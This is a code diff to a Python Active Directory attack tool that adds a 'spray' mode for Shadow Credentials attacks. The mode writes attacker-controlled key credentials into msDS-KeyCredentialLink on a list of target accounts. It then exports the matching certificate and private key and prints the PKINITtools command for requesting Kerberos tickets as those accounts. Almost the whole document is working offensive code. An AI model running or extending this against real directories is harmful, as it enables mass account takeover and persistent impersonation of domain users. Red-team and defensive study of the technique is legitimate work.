@@ -388,6 +388,70 @@ class ShadowCredentials(object):
         return
 
 
+    def spray(self, password, path, export_type, domain):
+        logger.info("Performing attempts to add msDS-KeyCredentialLink for a list of users")
+        if type(self.target_samname) == str:
+            self.target_samname = [self.target_samname]
+        for samname in self.target_samname:
+            result = self.get_dn_sid_from_samname(samname)
+            if not result:
+                continue
+            else:
+                certificate_dn = result[0]
+                certificate_samname = samname
+                break
+        certificate = X509Certificate2(subject=certificate_samname, keySize=2048, notBefore=(-40*365), notAfter=(40*365))
+        keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=certificate_dn, currentTime=DateTime())
+        targets_owned = []
+        for samname in self.target_samname:
+            result = self.get_dn_sid_from_samname(samname)
+            if not result:
+                #logger.error(f'Target account does not exist! (wrong domain?): {samname}')
+                continue
+            else:
+                self.target_dn = result[0]
+            self.ldap_session.search(self.target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
+            results = None
+            for entry in self.ldap_session.response:
+                if entry['type'] != 'searchResEntry':
+                    continue
+                results = entry
+            if not results:
+                #logger.error(f'Could not query target user properties: {samname}')
+                continue
+            try:
+                new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
+                self.ldap_session.modify(self.target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
+                if self.ldap_session.result['result'] == 0:
+                    targets_owned.append(samname)
+                    logger.success(f"Updated the msDS-KeyCredentialLink attribute of the target object: {samname}")
+            except IndexError:
+                logger.info('Attribute msDS-KeyCredentialLink does not exist')
+        if targets_owned:
+            if path is None:
+                path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
+                logger.verbose("No filename was provided. The certificate(s) will be stored with the filename: %s" % path)
+            if export_type == "PEM":
+                certificate.ExportPEM(path_to_files=path)
+                logger.success("Saved PEM certificate at path: %s" % path + "_cert.pem")
+                logger.success("Saved PEM private key at path: %s" % path + "_priv.pem")
+                logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+                logger.verbose("Run the following command to obtain a TGT")
+                logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, domain, self.target_samname, path))
+            elif export_type == "PFX":
+                if password is None:
+                    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
+                    logger.verbose(f"No pass was provided. The certificate will be stored with the password: %s" % password)
+                certificate.ExportPFX(password=password, path_to_file=path)
+                logger.success("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
+                logger.info("Must be used with password: %s" % password)
+                logger.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+                logger.verbose("Run the following command to obtain a TGT")
+                logger.verbose("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, domain, self.target_samname, path))
+        else:
+            logger.warning("No user object was modified during the spray")
+
+
     def remove(self, device_id):
         logger.info("Searching for the target account")
         result = self.get_dn_sid_from_samname(self.target_samname)
@@ -582,9 +646,9 @@ class Logger(object):
             print("(╯°□°）╯︵ ┻━┻ WHAT HAVE YOU DONE !? (╯°□°）╯︵ ┻━┻")
             exit(0)
         elif verbosity == 4:
-            art = """⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            art = """
+
+
     ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠋⠉⡉⣉⡛⣛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
     ⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠄⠄⠄⠄⠄⢀⣸⣿⣿⡿⠿⡯⢙⠿⣿⣿⣿⣿⣿⣿
     ⣿⣿⣿⣿⣿⣿⡿⠄⠄⠄⠄⠄⡀⡀⠄⢀⣀⣉⣉⣉⠁⠐⣶⣶⣿⣿⣿⣿⣿⣿
@@ -680,8 +744,11 @@ class Logger(object):
 
 def parse_args():
     parser = argparse.ArgumentParser(add_help=True, description='Python (re)setter for property msDS-KeyCredentialLink for Shadow Credentials attacks.')
-    parser.add_argument("-t", "--target", type=str, required=True, dest="target_samname", help="Target account")
-    parser.add_argument("-a", "--action", choices=['list', 'add', 'remove', 'clear', 'info', 'export', 'import'], nargs='?', default='list', help='Action to operate on msDS-KeyCredentialLink')
+    target = parser.add_mutually_exclusive_group(required=True)
+    target.add_argument("-t", "--target", type=str, dest="target_samname", help="Target account")
+    target.add_argument("-tl", "--target-list", type=str, dest="target_samname_list", help="Path to a file with target accounts names (one per line)")
+
+    parser.add_argument("-a", "--action", choices=['list', 'add', 'spray', 'remove', 'clear', 'info', 'export', 'import'], nargs='?', default='list', help='Action to operate on msDS-KeyCredentialLink')
     parser.add_argument('--use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
     parser.add_argument("-v", "--verbose", dest="verbosity", action="count", default=0, help="verbosity level (-v for verbose, -vv for debug)")
     parser.add_argument("-q", "--quiet", dest="quiet", action="store_true", default=False, help="show no information at all")
@@ -723,9 +790,23 @@ def parse_args():
 
 
 def main():
-    if args.action == 'write' and args.delegate_from is None:
-        logger.error('`-delegate-from` should be specified when using `-action write` !')
+    #if args.action == 'write' and args.delegate_from is None:
+        #logger.error('`-delegate-from` should be specified when using `-action write` !')
+        #sys.exit(1)
+
+    if args.target_samname_list and args.action != 'spray':
+        logger.error('`--target-list` should be specified only when using `--action spray` !')
         sys.exit(1)
+
+    if args.target_samname_list:
+        if os.path.isfile(args.target_samname_list):
+            with open(args.target_samname_list, 'r') as f:
+                target_samname = f.read().splitlines()
+        else:
+            logger.error(f'File {args.target_samname_list} does not exist!')
+            sys.exit(1)
+    else:
+        target_samname = args.target_samname
 
     auth_lm_hash = ""
     auth_nt_hash = ""
@@ -738,11 +819,13 @@ def main():
 
     try:
         ldap_server, ldap_session = init_ldap_session(args=args, domain=args.auth_domain, username=args.auth_username, password=args.auth_password, lmhash=auth_lm_hash, nthash=auth_nt_hash)
-        shadowcreds = ShadowCredentials(ldap_server, ldap_session, args.target_samname)
+        shadowcreds = ShadowCredentials(ldap_server, ldap_session, target_samname)
         if args.action == 'list':
             shadowcreds.list()
         elif args.action == 'add':
             shadowcreds.add(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain)
+        elif args.action == 'spray':
+            shadowcreds.spray(password=args.pfx_password, path=args.filename, export_type=args.export, domain=args.auth_domain)
         elif args.action == 'remove':
             shadowcreds.remove(args.device_id)
         elif args.action == 'info':
